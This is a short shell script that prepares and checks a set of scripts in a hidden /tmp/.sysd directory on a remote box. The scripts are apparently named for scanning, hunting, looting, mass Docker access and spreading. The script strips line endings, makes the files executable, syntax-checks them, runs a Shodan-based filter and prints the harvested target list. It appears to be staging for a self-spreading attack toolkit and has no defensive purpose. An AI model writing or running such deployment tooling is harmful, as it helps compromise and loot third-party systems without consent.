#!/bin/sh
# throwaway: run ON the box, AFTER being CR-stripped by the launcher
cd /tmp/.sysd || exit 1
CR=$(printf '\015')
Q=$(printf '\042')
for f in *.sh worker.env; do tr -d "$CR" < "$f" > "/tmp/h.tmp" && mv -f "/tmp/h.tmp" "$f"; done
chmod 0755 *.sh
printf 'cr=' ; tr -cd "$CR" < shodan.sh | wc -c
printf 'quotes=' ; tr -cd "$Q" < shodan.sh | wc -c
wc -c shodan.sh
for f in shodan.sh hunt.sh loot.sh dock.sh dockmass.sh spread.sh bootstrap.sh updater.sh run.sh tune.sh publish.sh; do
    printf '%s ' "$f"
    if sh -n "$f" 2>/dev/null; then echo ok; else echo FAIL; fi
done
echo ===STAT
sh shodan.sh stat
echo ===FILTER
IDB_MAX=5 sh shodan.sh filter
echo ===IDB
wc -l .hunt/idb.txt
head -3 .hunt/idb.txt
echo ===TMPFILES
ls /tmp/.sysd | head -20
